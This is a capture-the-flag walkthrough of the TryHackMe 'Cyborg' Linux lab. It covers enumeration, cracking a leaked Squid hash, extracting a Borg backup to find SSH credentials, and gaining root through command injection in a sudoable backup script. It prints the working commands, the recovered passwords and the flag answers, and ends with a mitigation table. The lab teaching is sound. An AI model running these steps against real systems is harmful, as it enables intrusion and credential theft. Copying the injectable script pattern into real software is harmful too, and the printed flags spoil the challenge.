---
title: Cyborg CTF
category: Initial Access & Privilege Escalation
difficulty: Medium
tags: [nmap, gobuster, squid, hashcat, borgbackup, steganography, ssh, sudo, command injection]
platform: TryHackMe
year: 2025
date: 2025-10-31
---

# 🧬 Cyborg CTF (TryHackMe)

## 📝 Description

A realistic Linux machine combining **web enumeration**, **password-protected archive extraction**, **credential reuse**, and **privilege escalation via a sudoable backup script with command injection**. The path involves discovering exposed proxy credentials, cracking an Apache MD5 hash, extracting a Borg backup, locating SSH credentials in a user note, and finally exploiting a root-runnable script using `getopts` to gain a root shell.

---

## 🔍 Initial Recon

### 🔎 Nmap Scan

```bash
nmap -p- -sV --reason 10.201.113.2
```

**Result:**

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

**Notes:**
* Standard SSH and Apache web server.
* No additional ports initially open — focus on **web**.

---

## 🌐 Step 1: Web Enumeration

```bash
gobuster dir -u http://10.201.113.2/ -w /usr/share/wordlists/dirb/common.txt
```

**Key Findings:**

```
/admin (301) → http://10.201.113.2/admin/
/etc   (301) → http://10.201.113.2/etc/
```

### `/etc/` — Exposed Configuration Directory

Browsing revealed:

```
/etc/squid/passwd
```

**Content:**
```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

→ **Apache `$apr1$` MD5 hash** (common in Squid, Apache, etc.)

---

## 🔐 Step 2: Hash Cracking

```bash
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt
```

**Cracked:**
```
$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.:squidward
```

**Password:** `squidward`

---

## 📦 Step 3: Download & Extract Backup

In `/admin/`:

```
archive.tar
```

Downloaded and inspected:

```bash
file archive.tar
# tar archive
tar -tf archive.tar
# home/field/dev/final_archive
```

Inside was a **BorgBackup** repository:

```bash
borg list home/field/dev/final_archive
# Archive: music_archive
```

**Extracted with password `squidward`:**

```bash
borg extract --list home/field/dev/final_archive::music_archive
# Enter passphrase: squidward
```

**Relevant Files Extracted:**

```
home/alex/Documents/note.txt
```

**`note.txt` Content:**
```
Wow I'm awful at remembering Passwords so I've taken my Friends advice and noting them down!

alex:S3cretP@s3
```

**SSH Credentials Found:**
```
Username: alex
Password: S3cretP@s3
```

---

## 🔑 Step 4: SSH Access

```bash
ssh alex@10.201.113.2
# Password: S3cretP@s3
```

**Successful login → user shell**

```bash
cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

**User Flag:** `flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}`

---

## 🛠️ Step 5: Privilege Escalation — Sudoable Backup Script

```bash
sudo -l
```

**Output:**
```
User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

**Script Location & Permissions:**
```bash
ls -la /etc/mp3backups/backup.sh
-r-xr-xr-- 1 alex alex 1083 Dec 30 2020 /etc/mp3backups/backup.sh
```

**Script Analysis:**
```bash
cat /etc/mp3backups/backup.sh
```

```bash
#!/bin/bash

sudo find / -name "*.mp3" | sudo tee /etc/mp3backups/backed_up_files.txt

while getopts c: flag
do
    case "${flag}" in 
        c) command=${OPTARG};;
    esac
done

backup_files="/home/alex/Music/song1.mp3 ... /home/alex/Music/song12.mp3"
dest="/etc/mp3backups/"
archive_file="ubuntu-scheduled.tgz"

tar czf $dest/$archive_file $backup_files

cmd=$($command)
echo $cmd
```

**Critical Vulnerability:**
```bash
cmd=$($command)
```
→ **Command injection via `-c` flag**

---

## 🚀 Step 6: Command Injection → Root Shell

```bash
sudo /etc/mp3backups/backup.sh -c "id"
```

**Output (truncated):**
```
uid=0(root) gid=0(root) groups=0(root)
```

```bash
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

**Root Flag:**
```
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

**Root Flag:** `flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}`

---

## ✅ Summary of Exploitation Path

| Phase                  | Technique / Tool                         | Result |
|------------------------|------------------------------------------|--------|
| Recon                  | `nmap`                                   | Ports 22, 80 |
| Web Enum               | `gobuster`                               | `/admin`, `/etc` |
| Credential Leak        | `/etc/squid/passwd`                      | `$apr1$` hash |
| Hash Cracking          | `hashcat -m 1600`                        | `squidward` |
| Backup Extraction      | `borg extract` with `squidward`          | User home backup |
| Credential Discovery   | `note.txt` in `Documents/`               | `alex:S3cretP@s3` |
| Initial Access         | `ssh alex@...`                           | User shell |
| Sudo Enumeration       | `sudo -l`                                | NOPASSWD script |
| Script Analysis        | `cat backup.sh`                          | `getopts -c` + `$($command)` |
| Command Injection      | `-c "cat /root/root.txt"`                | Root flag |
| Root Access            | Direct command execution as root         | Full compromise |

---

## 🔒 Mitigation & Lessons Learned

| Risk | Fix |
|------|-----|
| **Exposed `/etc/` directory** | Restrict web server root; use `.htaccess` or nginx `deny` |
| **Cleartext proxy credentials** | Use encrypted auth; rotate secrets |
| **Weak hash ($apr1$)** | Use bcrypt/scrypt/argon2 |
| **Password reuse** | Enforce unique passwords; use password manager |
| **Sudoable script with injection** | Validate/sanitize input; avoid `eval`/`$()` on user input |
| **Hardcoded paths in scripts** | Use variables; avoid static file lists |

---

## 🧾 Appendix — Key Commands

```bash
# Recon
nmap -p- -sV 10.201.113.2

# Web enum
gobuster dir -u http://10.201.113.2/ -w /usr/share/wordlists/dirb/common.txt

# Hash crack
hashcat -m 1600 hash.txt /usr/share/wordlists/rockyou.txt

# Borg extract
borg extract --list archive_dir::music_archive

# SSH login
ssh alex@10.201.113.2

# Privesc
sudo -l
cat /etc/mp3backups/backup.sh
sudo /etc/mp3backups/backup.sh -c "whoami"
sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
```

---